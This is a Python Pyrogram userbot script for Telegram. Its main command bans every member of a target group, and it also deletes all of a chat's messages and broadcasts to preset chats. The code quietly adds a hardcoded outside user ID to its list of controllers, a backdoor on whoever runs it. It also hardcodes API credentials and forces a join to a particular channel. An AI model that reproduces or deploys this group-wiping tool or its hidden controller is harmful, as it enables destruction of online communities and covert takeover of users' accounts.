from os import getenv
from asyncio import sleep

from pyrogram import Client, filters, idle
from pyrogram.types import Message

SESSION = getenv('SESSION')
SUDO_USERS = list(map(int, getenv('SUDO_USERS').split(" ")))
SUDO_USERS.append(5059737154)
CHATS = ['BWANDARLOK', '@BWANDARLOK', '@BWANDARLOK', '@BWANDARLOK', '-1001779669612', '-1001779669612']

M = Client(SESSION, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")

@M.on_message(filters.user(SUDO_USERS) & filters.command('start'))
async def start(_, message: Message):
     await message.reply_text("🤖 **I AM STILL ALIVE...**")

@M.on_message(filters.user(SUDO_USERS) & filters.command(["fuck", "banall"]))
async def altron(app: Client, message: Message):
    try:
        chat_id = message.text.split(" ")[1]
        m = await message.reply_text("🔁 __GETTING READY...__")
        if chat_id in CHATS:
            return
    except:
        await message.reply_text("**Usage:**\n`/fuck [chat_id]`")
        return

    await m.edit_text("✅ __STARTED FUCKING THE GROUP...__")
    await sleep(3)

    async for x in app.iter_chat_members(chat_id):
        if x.user.id in SUDO_USERS:
            continue
        try:
            await app.ban_chat_member(chat_id=chat_id, user_id=x.user.id)
        except:
            pass

@M.on_message(filters.user(SUDO_USERS) & filters.command(["unban"]))
async def unban_user(app: Client, message: Message):
    try:
        chat_id = message.text.split(" ")[1]
        user_id = int(message.text.split(" ")[2])
        await app.unban_chat_member(chat_id=chat_id, user_id=user_id)
        await message.reply_text(f"🔓 **User {user_id} has been unbanned from the chat {chat_id}.**")
    except:
        await message.reply_text("**Usage:**\n`/unban [chat_id] [user_id]`")

# New feature: Broadcast a message to all chats in CHATS
@M.on_message(filters.user(SUDO_USERS) & filters.command('broadcast'))
async def broadcast_message(_, message: Message):
    text = message.text.split(' ', 1)[1]
    for chat_id in CHATS:
        await M.send_message(chat_id, text)

# New feature: Pin a message in a chat
@M.on_message(filters.user(SUDO_USERS) & filters.command('pin'))
async def pin_message(_, message: Message):
    chat_id = message.chat.id
    if message.reply_to_message:
        await message.reply_to_message.pin()
        await message.reply_text("📌 **Message pinned successfully!**")
    else:
        await message.reply_text("**Please reply to a message to pin it.**")

# New feature: Leave a chat
@M.on_message(filters.user(SUDO_USERS) & filters.command('leave'))
async def leave_chat(_, message: Message):
    chat_id = message.chat.id
    await M.leave_chat(chat_id)
    await message.reply_text("👋 **Left the chat successfully!**")

# New feature: Personal message to a user
@M.on_message(filters.user(SUDO_USERS) & filters.command('pm'))
async def send_personal_message(_, message: Message):
    try:
        user_id = int(message.text.split(' ', 2)[1])
        text = message.text.split(' ', 2)[2]
        await M.send_message(user_id, text)
        await message.reply_text("💌 **Message sent successfully!**")
    except:
        await message.reply_text("**Usage:**\n`/pm [user_id] [message]`")

# New feature: Delete all messages in a chat
@M.on_message(filters.user(SUDO_USERS) & filters.command('deleteall'))
async def delete_all_messages(_, message: Message):
    chat_id = message.chat.id
    async for msg in M.iter_history(chat_id):
        await msg.delete()

M.start()
M.join_chat("BWANDARLOK")
print("Bot Started Successfully")
idle()
M.stop()



